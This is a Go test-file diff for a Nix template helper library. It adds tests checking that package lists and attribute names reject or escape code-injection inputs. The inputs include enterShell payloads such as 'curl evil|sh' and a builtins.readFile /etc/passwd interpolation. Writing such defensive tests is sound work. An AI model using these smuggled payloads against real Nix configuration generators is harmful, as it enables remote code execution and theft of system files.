@@ -1,7 +1,9 @@
 package tmpl
 
 import (
+	"strings"
 	"testing"
+	"text/template"
 )
 
 func TestNixPkgList(t *testing.T) {
@@ -13,12 +15,45 @@ func TestNixPkgList(t *testing.T) {
 		{"empty", nil, "[ ]"},
 		{"single", []string{"git"}, "[ pkgs.git ]"},
 		{"multiple", []string{"git", "curl", "jq"}, "[ pkgs.git pkgs.curl pkgs.jq ]"},
+		{"attr_path", []string{"python312Packages.pip", "gcc-arm-embedded"}, "[ pkgs.python312Packages.pip pkgs.gcc-arm-embedded ]"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			got := nixPkgList(tt.input)
+			got, err := nixPkgList(tt.input)
+			if err != nil {
+				t.Fatalf("nixPkgList(%v) error: %v", tt.input, err)
+			}
 			if got != tt.want {
 				t.Errorf("nixPkgList(%v) = %q, want %q", tt.input, got, tt.want)
+			}
+		})
+	}
+}
+
+// nixInjectionInputs are package/list items that would splice extra Nix code
+// into the generated file if emitted verbatim.
+var nixInjectionInputs = []string{
+	`hello ]; enterShell = "echo pwned"; x = [ pkgs.hello`,
+	"hello\nenterShell",
+	`${builtins.readFile /etc/passwd}`,
+	`"quoted"`,
+	"a;b",
+	"a b",
+	".leading",
+	"trailing.",
+	"a..b",
+	"1digit",
+	"",
+	"let",
+	"pkgs.with",
+}
+
+func TestNixPkgList_RejectsInjection(t *testing.T) {
+	for _, in := range nixInjectionInputs {
+		t.Run(in, func(t *testing.T) {
+			got, err := nixPkgList([]string{"jq", in})
+			if err == nil {
+				t.Fatalf("nixPkgList accepted %q, produced %q", in, got)
 			}
 		})
 	}
@@ -36,9 +71,58 @@ func TestNixList(t *testing.T) {
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			got := nixList(tt.input)
+			got, err := nixList(tt.input)
+			if err != nil {
+				t.Fatalf("nixList(%v) error: %v", tt.input, err)
+			}
 			if got != tt.want {
 				t.Errorf("nixList(%v) = %q, want %q", tt.input, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestNixList_RejectsInjection(t *testing.T) {
+	for _, in := range nixInjectionInputs {
+		t.Run(in, func(t *testing.T) {
+			if got, err := nixList([]string{in}); err == nil {
+				t.Fatalf("nixList accepted %q, produced %q", in, got)
+			}
+		})
+	}
+}
+
+func TestNixFuncMap_TemplateFailsOnInjectedPackage(t *testing.T) {
+	tpl := template.Must(template.New("t").Funcs(NixFuncMap()).Parse(`{ packages = {{ nixPkgList .Packages }}; }`))
+	var buf strings.Builder
+	err := tpl.Execute(&buf, map[string]any{
+		"Packages": []string{"jq", `hello ]; enterShell = "curl evil|sh"; x = [ pkgs.hello`},
+	})
+	if err == nil {
+		t.Fatalf("template rendered injected package: %q", buf.String())
+	}
+	if strings.Contains(buf.String(), "enterShell") {
+		t.Errorf("injected code reached output: %q", buf.String())
+	}
+}
+
+func TestNixAttrName(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+		want  string
+	}{
+		{"identifier", "GOFLAGS", "GOFLAGS"},
+		{"dash_and_quote", "a-b'c", "a-b'c"},
+		{"dotted_is_quoted", "a.b", `"a.b"`},
+		{"injection_is_quoted", `X = "y"; enterShell`, `"X = \"y\"; enterShell"`},
+		{"interpolation_is_escaped", "${evil}", `"\${evil}"`},
+		{"keyword_is_quoted", "inherit", `"inherit"`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := NixAttrName(tt.input); got != tt.want {
+				t.Errorf("NixAttrName(%q) = %q, want %q", tt.input, got, tt.want)
 			}
 		})
 	}
@@ -125,6 +209,7 @@ func TestNixAttrSet(t *testing.T) {
 		{"empty", map[string]string{}, "{ }"},
 		{"single", map[string]string{"key": "val"}, `{ key = "val"; }`},
 		{"multiple_sorted", map[string]string{"b": "2", "a": "1", "c": "3"}, `{ a = "1"; b = "2"; c = "3"; }`},
+		{"injection_key_quoted", map[string]string{`K = "v"; enterShell = "pwn"; J`: "x"}, `{ "K = \"v\"; enterShell = \"pwn\"; J" = "x"; }`},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -138,10 +223,10 @@ func TestNixAttrSet(t *testing.T) {
 
 func TestIndent(t *testing.T) {
 	tests := []struct {
-		name   string
-		n      int
-		input  string
-		want   string
+		name  string
+		n     int
+		input string
+		want  string
 	}{
 		{"zero_noop", 0, "hello\nworld", "hello\nworld"},
 		{"four_spaces_multiline", 4, "line1\nline2", "    line1\n    line2"},
